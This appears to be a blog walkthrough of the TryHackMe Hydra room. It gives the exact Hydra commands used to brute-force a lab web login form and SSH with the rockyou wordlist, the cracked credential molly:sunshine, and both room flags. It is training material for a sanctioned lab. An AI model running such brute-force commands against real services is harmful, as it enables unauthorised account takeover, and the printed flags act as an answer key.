---
title: "TryHackMe — Hydra Walkthrough"
summary: "This room demonstrates how Hydra can be used to brute-force online authentication across multiple protocols."
date: "2026-04-19"
tags: ["tryhackme","walkthrough"]
---


Open the target in a browser and use Developer Tools → Network to capture the login POST. A single failed login attempt produced the following:

- **POST path:** /login
- **POST body fields:** username and password
- **Failure string:** Your username or password is incorrect.

We used these exact values in the http-post-form syntax required by Hydra.

![Pasted image 20260419103420](/images/blog/hydra_img/Pasted_image_20260419103420.png)
## Web brute force

**Command used:**

hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.107.194 http-post-form “/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect.” -V -t 4

![Pasted image 20260419103356](/images/blog/hydra_img/Pasted_image_20260419103356.png)
![Pasted image 20260419103408](/images/blog/hydra_img/Pasted_image_20260419103408.png)


**Post-exploit (retrieve flag1):**

- Log into the web app with molly:sunshine in the browser, or use curl to establish a session and pull likely flag paths. The web login revealed **Flag 1**:

**_Flag 1: THM{2673a7dd116de68e85c48ec0b1f2612e}_**

![Pasted image 20260419103430](/images/blog/hydra_img/Pasted_image_20260419103430.png)

## SSH brute force (flag2)

**Command used:**

hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.107.194 -t 4 ssh -V

![Pasted image 20260419103443](/images/blog/hydra_img/Pasted_image_20260419103443.png)

**Post-exploit (SSH and flag retrieval):**

ssh molly@10.201.107.194

![Pasted image 20260419103449](/images/blog/hydra_img/Pasted_image_20260419103449.png)


```
pwd
ls -la
```

```
cat flag2.txt
```

**Flag 2 content (from /home/molly/flag2.txt):  
****_THM{c8eeb0468febbadea859baeb33b2541b}_**

![Pasted image 20260419103459](/images/blog/hydra_img/Pasted_image_20260419103459.png)

























